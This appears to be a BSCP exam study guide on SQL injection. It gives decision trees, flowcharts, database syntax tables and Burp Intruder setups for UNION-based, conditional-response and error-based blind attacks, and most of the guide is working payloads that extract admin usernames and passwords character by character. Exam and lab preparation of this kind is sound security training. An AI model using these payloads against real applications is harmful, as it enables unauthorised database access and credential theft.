# SQL Injection Complete Guide - BSCP Exam Reference

## Attack Type Decision Tree

When you encounter a SQL injection vulnerability, determine which type it is:

### Quick Identification

**Step 1: Can you see query results in the response?**

```
YES → Try UNION-based attack
NO  → Proceed to Step 2
```

**Step 2: When you inject TRUE vs FALSE conditions, do you get different responses?**

```
YES → Use Blind SQL Injection (conditional response)
NO  → Proceed to Step 3
```

**Step 3: Do error messages appear in the response?**

```
YES → Use Error-based Blind SQL Injection
NO  → Use Time-based Blind SQL Injection (not covered in this guide)
```

---

## Three SQL Injection Methods for BSCP

### Method 1: UNION-based SQL Injection

**Use when:** Application displays query results directly

**Speed:** Fastest (5-10 minutes for full exploitation)

**Process:**
1. Find column count with ORDER BY
2. Identify text columns
3. Determine database type
4. Query information_schema for table/column names
5. Extract data directly with UNION SELECT

**Advantages:**
- Direct data output
- Fast extraction of large datasets
- Straightforward approach
- No guessing required

**Disadvantages:**
- Requires exact column count
- Requires data type matching
- Doesn't work if results are filtered

**Document:** BSCP_UNION_based_SQL_Injection.md

**Example:** 
```
search=test' UNION SELECT username,password FROM users--
Results: admin|password123, user1|pass456
```

---

### Method 2: Blind SQL Injection (Conditional Response)

**Use when:** Application doesn't show results but responds differently to TRUE/FALSE conditions

**Speed:** Medium (15-25 minutes for full exploitation)

**Process:**
1. Confirm TRUE vs FALSE responses are different
2. Test table/column existence with conditional queries
3. Find password length using comparison operators
4. Extract characters one by one using Burp Intruder
5. Piece together full password

**Advantages:**
- Works when results aren't displayed
- Reliable boolean logic
- Can extract any data that exists

**Disadvantages:**
- Slower than UNION attacks
- Character-by-character extraction is tedious
- Requires Burp Intruder for efficiency
- False positives possible with similar responses

**Document:** BSCP_Blind_SQL_Injection_Conditional_Response.md

**Example:**
```
Injection: ' AND '1'='1       → Shows products
Injection: ' AND '1'='2       → No products

Test: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'
TRUE  → First character is 'a'
FALSE → First character is not 'a'
```

---

### Method 3: Error-based Blind SQL Injection

**Use when:** Application doesn't display results, but DOES show different error messages based on conditions

**Speed:** Medium (15-20 minutes for full exploitation)

**Process:**
1. Confirm error messages change with TRUE/FALSE conditions
2. Use CASE WHEN statements to trigger errors conditionally
3. 500 error = TRUE, 200 OK = FALSE (or vice versa)
4. Extract data using division-by-zero errors
5. Use Burp Intruder to automate character extraction

**Advantages:**
- More reliable than response content differences
- Works when response content is always the same
- Errors are clear TRUE/FALSE indicators
- Faster than time-based attacks

**Disadvantages:**
- Syntax differs significantly between databases
- Oracle requires special handling (DUAL table, TO_CHAR)
- Slightly more complex than conditional response
- Server must expose error messages

**Document:** BSCP_Blind_SQL_Injection_Conditional_Errors.md

**Example:**
```
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '
→ 500 Internal Server Error (TRUE condition)

' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '
→ 200 OK (FALSE condition)
```

---

## Attack Flowcharts by Type

### UNION Attack Flow

```
Inject: ' ORDER BY 1--
    ↓
Did you get an error?
├─ YES → Try lower number (use binary search)
└─ NO → Try higher number

Found max working number?
    ↓
Inject: ' UNION SELECT NULL,NULL,... (matching column count)
    ↓
Replace NULLs with 'test' one at a time
    ↓
Which positions accept text?
    ↓
Inject: ' UNION SELECT VERSION(),NULL... (in text columns)
    ↓
Database identified → use specific payloads for that database
    ↓
Inject: ' UNION SELECT table_name,NULL FROM information_schema.tables
    ↓
Find target table name
    ↓
Inject: ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='target'
    ↓
Find target columns
    ↓
Inject: ' UNION SELECT username,password FROM target_table
    ↓
DATA EXTRACTED ✓
```

### Blind SQL Injection Flow

```
Inject: ' AND '1'='1  vs  ' AND '1'='2
    ↓
Do you get different responses?
├─ YES → Use Conditional Response method (this guide)
└─ NO → Go to Step 2

Try: ' AND (SELECT 'x' FROM users LIMIT 1)='x'
    ↓
Do you get different response than normal?
├─ YES → Table 'users' exists
└─ NO → Try another table name

Try: ' AND (SELECT username FROM users WHERE username='admin')='admin'
    ↓
Different response = user exists
    ↓
Try: ' AND (SELECT username FROM users WHERE username='admin' AND LENGTH(password)>1)='admin'
    ↓
Binary search for exact password length
    ↓
Try: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'
    ↓
Set up Burp Intruder with character payload set
    ↓
Run Intruder for each position 1 to N
    ↓
Look for different response length or content
    ↓
That character = correct
    ↓
Repeat for positions 2, 3, 4... N
    ↓
Concatenate all characters
    ↓
DATA EXTRACTED ✓
```

### Error-based Attack Flow

```
Inject: ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '
    ↓
Do you get 500 error?
├─ YES (TRUE gives error) → Understand this pattern
└─ NO → Try with 1=2 condition instead

Inject: ' || (SELECT '' FROM DUAL) || '
    ↓
Got 200 OK? → Oracle database confirmed
    ↓
Inject: ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1) || '
    ↓
Got 500 error? → users table exists
    ↓
Inject: ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='admin') || '
    ↓
Got 500 error? → User 'admin' exists
    ↓
Inject: ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='admin' AND LENGTH(password)>10) || '
    ↓
Binary search for password length
    ↓
Setup Burp Intruder with: ' || (SELECT CASE WHEN (SUBSTR(password,1,1)='§x§') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='admin') || '
    ↓
Run Intruder with character payload set
    ↓
Look for 500 error response (different from 200 OK)
    ↓
That character = correct
    ↓
Repeat for positions 2, 3, 4... N
    ↓
Concatenate all characters
    ↓
DATA EXTRACTED ✓
```

---

## Database-Specific Syntax Comparison

| Task | PostgreSQL | MySQL | SQL Server | Oracle |
|------|-----------|-------|-----------|--------|
| Version | `VERSION()` | `VERSION()` | `@@version` | `BANNER FROM v$version` |
| Tables | `FROM information_schema.tables` | `FROM information_schema.tables` | `FROM information_schema.tables` | `FROM user_tables` |
| Columns | `FROM information_schema.columns` | `FROM information_schema.columns` | `FROM information_schema.columns` | `FROM user_tab_columns` |
| Substring | `substring(x,1,1)` | `SUBSTRING(x,1,1)` | `SUBSTRING(x,1,1)` | `SUBSTR(x,1,1)` |
| Length | `LENGTH(x)` | `LENGTH(x)` | `LEN(x)` | `LENGTH(x)` |
| Concatenate | `\|\|` | `CONCAT()` | `+` | `\|\|` |
| Limit rows | `LIMIT 1` | `LIMIT 1` | `TOP 1` | `WHERE ROWNUM=1` |
| Error trigger | `1/0` | `1/0` | `1/0` | `1/0` with `TO_CHAR()` |
| Dummy table | (none) | (none) | (none) | `DUAL` |

---

## Quick Payload Reference by Attack Type

### UNION Attack Payloads

```
Find column count:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

Test text columns:
' UNION SELECT NULL,NULL--
' UNION SELECT 'test',NULL--
' UNION SELECT NULL,'test'--

Get database version:
' UNION SELECT VERSION(),NULL--

List all tables:
' UNION SELECT table_name,NULL FROM information_schema.tables--

Find columns in a table:
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

Extract data:
' UNION SELECT username,password FROM users--

Concatenate multiple columns:
' UNION SELECT username||':'||password,NULL FROM users--
```

### Blind SQL Injection (Conditional) Payloads

```
Test injection (TRUE):
' AND '1'='1

Test injection (FALSE):
' AND '1'='2

Check if table exists:
' AND (SELECT 'x' FROM users LIMIT 1)='x'--

Check if specific user exists:
' AND (SELECT username FROM users WHERE username='admin')='admin'--

Find password length:
' AND (SELECT username FROM users WHERE username='admin' AND LENGTH(password)>10)='admin'--

Extract character (position 1):
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

Extract character (position N):
' AND (SELECT SUBSTRING(password,N,1) FROM users WHERE username='admin')='a'--
```

### Error-based SQL Injection (Conditional) Payloads

```
Test database type (Oracle):
' || (SELECT '' FROM DUAL) || '

Test CASE WHEN (TRUE):
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '

Test CASE WHEN (FALSE):
' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '

Check if table exists:
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1) || '

Check if user exists:
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='admin') || '

Find password length:
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='admin' AND LENGTH(password)>10) || '

Extract character (position 1):
' || (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='admin') || '

Extract character (position N):
' || (SELECT CASE WHEN (SUBSTR(password,N,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='admin') || '
```

---

## Burp Suite Setup by Attack Type

### UNION Attack - Repeater Setup

1. Send request to Repeater
2. Modify the vulnerable parameter
3. Add UNION SELECT payloads
4. Check Response tab for:
   - Error messages (column count wrong)
   - Version output (database identified)
   - Table names (tables found)
   - Actual data (success)

### Blind SQL Injection - Intruder Setup

1. Send request to Intruder
2. Modify payload with character marker: `'...='§x§'--`
3. Highlight just the 'x'
4. Click "Add" to set payload position
5. Payload type: "Simple list"
6. Add characters: `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*-_=+`
7. Click "Start attack"
8. Sort by response length/content
9. Find the outlier response = correct character

### Error-based Attack - Intruder Setup

Same as Blind SQL Injection, but watch for:
- 500 error responses (TRUE)
- 200 OK responses (FALSE)
- One response type will be different from the others

---

## Lab Completion Checklist

### For UNION Attacks

```
Before logging in with extracted credentials:
[ ] Exact column count confirmed (ORDER BY worked)
[ ] Database type identified (VERSION queried)
[ ] Table name found (information_schema.tables queried)
[ ] Column names found (information_schema.columns queried)
[ ] Username and password extracted (UNION SELECT worked)
[ ] Data is readable (not encrypted/encoded)
[ ] No extra characters in password (verify carefully)
```

### For Blind SQL Injection

```
Before logging in with extracted credentials:
[ ] Confirmed TRUE vs FALSE responses are different
[ ] Table name confirmed to exist
[ ] Username confirmed to exist
[ ] Password length determined (exact character count)
[ ] All character positions extracted (1 through N)
[ ] All characters concatenated into complete password
[ ] No extra spaces or characters in password
[ ] Data matches expected format
```

### For Error-based Blind SQL Injection

```
Before logging in with extracted credentials:
[ ] Database type identified (Oracle/MySQL/PostgreSQL)
[ ] Table name confirmed to exist
[ ] Username confirmed to exist
[ ] Password length determined (exact character count)
[ ] All character positions extracted (1 through N)
[ ] All characters concatenated into complete password
[ ] Error responses (500 vs 200) are clear and consistent
[ ] No extra spaces or characters in password
```

---

## Common Mistakes Across All Methods

```
[ ] Forgetting to comment out query remainder (-- or #)
[ ] Not URL encoding payloads (spaces = +, quotes = %27)
[ ] Wrong function name for database (SUBSTR vs SUBSTRING)
[ ] Assuming table/column names without verifying
[ ] Not matching column count in UNION SELECT
[ ] Using wrong data type in UNION SELECT
[ ] Password extraction includes extra characters
[ ] Not using LIMIT/ROWNUM to get single row
[ ] Confusing which database function to use
[ ] Not automating with Intruder (manually testing all chars)
```

---

## Time Management Strategy for BSCP Exam

**Total exam time:** 2 hours

**Recommended time allocation:**

```
SQL Injection Lab: 45-60 minutes maximum

UNION Attack (if available):
- Vulnerability identification: 2 min
- Column count: 3 min
- Text columns: 2 min
- Database type: 2 min
- Table names: 2 min
- Column names: 2 min
- Data extraction: 2 min
Total: 15-20 minutes

Blind SQL - Conditional Response:
- Vulnerability identification: 3 min
- TRUE/FALSE confirmation: 2 min
- Table discovery: 3 min
- Username confirmation: 2 min
- Password length: 5 min
- Character extraction (Intruder): 10 min
Total: 25-30 minutes

Blind SQL - Error-based:
- Vulnerability identification: 2 min
- Database type: 2 min
- TRUE/FALSE error patterns: 3 min
- Table discovery: 2 min
- Username confirmation: 2 min
- Password length: 5 min
- Character extraction (Intruder): 10 min
Total: 25-28 minutes
```

**Key time-saving tactics:**
1. Set up Intruder with full character set from start
2. Let Intruder run while you document findings
3. Try common table names first (users, admin, accounts)
4. Try common usernames first (administrator, admin, root)
5. Use binary search for password length (faster than sequential)
6. Have all three guides open for quick reference

---

## Document Quick Links

| Attack Type | Scenario | Document |
|-------------|----------|----------|
| UNION-based | Can see query results | BSCP_UNION_based_SQL_Injection.md |
| Blind SQL (conditional) | Different responses for TRUE/FALSE | BSCP_Blind_SQL_Injection_Conditional_Response.md |
| Blind SQL (error-based) | Different error messages for TRUE/FALSE | BSCP_Blind_SQL_Injection_Conditional_Errors.md |

---

## Final Exam Tips

1. **Read the lab description carefully** - It hints at which type of injection you're dealing with

2. **Test thoroughly before extracting** - Confirm TRUE/FALSE responses work before spending time extracting data

3. **Start with ORDER BY 1, 2, 3...** - Even in blind attacks, ORDER BY can sometimes work to find column count

4. **Use common names** - Most labs use 'users' table, 'administrator' username, 'password' column

5. **Intruder is your friend** - Don't manually test 52 characters one by one - set up Intruder

6. **Document as you go** - Write down table names, column names, results - helps with troubleshooting

7. **Test payloads in browser first** - Before sending to Intruder, verify payload syntax works

8. **Check application comments** - Sometimes errors appear in HTML comments, not response body

9. **Verify extracted data** - Before submitting, try logging in to confirm credentials work

10. **Remember the goal** - Extract administrator password and login to complete the lab

---
